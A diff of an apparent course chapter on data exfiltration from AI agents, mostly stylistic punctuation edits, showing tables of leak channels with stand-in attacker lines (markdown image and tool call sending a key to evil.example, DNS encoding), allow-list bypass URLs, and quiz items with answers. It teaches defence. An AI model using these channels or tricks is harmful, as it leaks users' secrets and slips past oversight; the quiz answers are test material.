@@ -41,8 +41,8 @@ ${table(
     ['Markdown image', '<code>![](https://evil.example/p.png?d=sk_live_…)</code>', '<b>the rendering client</b>, automatically'],
     ['Markdown link', '<code>[Your report](https://evil.example/r?d=…)</code>', 'the user, on click'],
     ['Autolinked URL', 'a bare URL in the answer text', 'the client, prefetching a link preview'],
-    ['DNS lookup', '<code>nbuw…y3ta.evil.example</code>', 'the resolver chain — works through HTTP proxies'],
-    ['Tool argument', '<code>send_email(to="a@evil.example", body=SECRET)</code>', 'the agent — the only one most policies check'],
+    ['DNS lookup', '<code>nbuw…y3ta.evil.example</code>', 'the resolver chain, which works through HTTP proxies'],
+    ['Tool argument', '<code>send_email(to="a@evil.example", body=SECRET)</code>', 'the agent (the only one most policies check)'],
     ['File write', 'a line in <code>/shared/notes.md</code>', 'cloud sync, a site build, or CI, minutes later'],
     ['Message to a peer agent', '<code>delegate(task="look up sk_live_…")</code>', 'the peer, which has the network access this one lacks'],
     ['Error message', '<code>ValueError: could not parse sk_live_…</code>', 'your own log shipper, into a shared sink'],
@@ -75,7 +75,7 @@ ${sim({
     filter.`,
 })}
 
-${h2('Control 1 — an egress allow-list that is actually correct', 'egress')}
+${h2('Control 1: an egress allow-list that is actually correct', 'egress')}
 
 ${p(`The control is simple and the implementation has three classic bugs. All three appear in real
 code.`)}
@@ -92,9 +92,9 @@ ${table(
   [
     ['<code>https://api.internal.corp/v1/write</code>', 'allow ✓', 'allow ✓'],
     ['<code>https://evil.example/p.png?d=sk_live</code>', 'deny ✓', 'deny ✓'],
-    ['<code>https://api.internal.corp<b>.evil.example</b>/x</code>', '<b>allow ✗</b> — suffix trick', 'deny ✓'],
-    ['<code>https://api.internal.corp<b>@evil.example</b>/x</code>', '<b>allow ✗</b> — userinfo trick', 'deny ✓'],
-    ['<code>http://169.254.169.254/latest/meta-data/</code>', 'deny ✓', 'deny ✓ — but see below'],
+    ['<code>https://api.internal.corp<b>.evil.example</b>/x</code>', '<b>allow ✗</b> (suffix trick)', 'deny ✓'],
+    ['<code>https://api.internal.corp<b>@evil.example</b>/x</code>', '<b>allow ✗</b> (userinfo trick)', 'deny ✓'],
+    ['<code>http://169.254.169.254/latest/meta-data/</code>', 'deny ✓', 'deny ✓, but see below'],
   ]
 )}
 
@@ -110,7 +110,7 @@ is worth a separate deny rule so the finding is legible.</li>
 runs. Network policy in the sandbox, an egress proxy, or a firewall rule cannot be argued with.</li>
 </ul>`)}
 
-${h2('Control 2 — do not render remote content from agent output', 'rendering')}
+${h2('Control 2: do not render remote content from agent output', 'rendering')}
 
 ${p(`This closes the EchoLeak family, and it is a client-side change rather than an agent-side one,
 which is why it is so often missed by the team that owns the agent.`)}
@@ -133,7 +133,7 @@ ${h2('What neither control fixes', 'residual')}
 ${ul([
   `<b>The human channel.</b> The agent tells the user something false and the user acts on it. No
    network involved at all. Mitigated by output provenance and by not presenting agent claims as
-   fact — not by egress policy.`,
+   fact, never by egress policy.`,
   `<b>The peer channel.</b> A second agent with wider egress. Score the graph, not the node
    (<a href="/chapters/a15/">A15</a>).`,
   `<b>The slow channel.</b> One bit per session, over many sessions, under every per-request
@@ -197,7 +197,7 @@ export const quiz = [
     explain: `Both tricks are trivially available to anyone who owns a domain. The suffix trick makes
       your allowed host a subdomain label of theirs; the userinfo trick puts it before an
       <code>@</code>, where browsers and most HTTP clients treat it as credentials and connect to what
-      follows. Parse the URL properly, compare the host component for equality, and — separately —
+      follows. Parse the URL properly, compare the host component for equality, and separately
       resolve and pin the address, because DNS rebinding attacks the gap between your check and your
       connection.`,
   },
@@ -207,7 +207,7 @@ export const quiz = [
     options: [
       `A per-message DLP scan.`,
       `An injection classifier on the input path.`,
-      `Aggregate monitoring across sessions plus per-identity rate limits — not any per-request inspection.`,
+      `Aggregate monitoring across sessions plus per-identity rate limits, not any per-request inspection.`,
       `Output length limits.`,
     ],
     answer: 2,
@@ -215,7 +215,7 @@ export const quiz = [
       the secret to be suspicious, and every request looks like normal traffic. Catching it needs
       state across sessions — repeated contact with the same unusual destination, a pattern of
       single-token outputs to one host, an identity whose traffic profile changed. That is A26's
-      trajectory-level monitoring. It is also worth noting the honest answer: the egress allow-list
+      trajectory-level monitoring. It is worth being honest that the egress allow-list
       would have prevented it outright, and prevention beats detection here.`,
   },
   {
@@ -244,10 +244,10 @@ export const quiz = [
       `In-process checks cannot see DNS.`,
     ],
     answer: 1,
-    explain: `An agent that can execute code — a coding agent, a data-analysis agent, anything with a
-      shell or an interpreter — can open its own socket, bypassing every check written in Python
-      beside it. Moving enforcement to network policy in the sandbox, an egress proxy, or a firewall
-      rule puts it below the level the agent operates at, which is the difference between a control
+    explain: `Plenty of agents can execute code: a coding agent, a data-analysis agent, anything with
+      a shell or an interpreter. Any of them can open its own socket, bypassing every check written
+      in Python beside it. Moving enforcement to network policy in the sandbox, an egress proxy, or
+      a firewall rule puts it below the level the agent operates at, which is the difference between a control
       the attacker must obey and a control the attacker can skip. It also happens to catch DNS.`,
   },
 ];
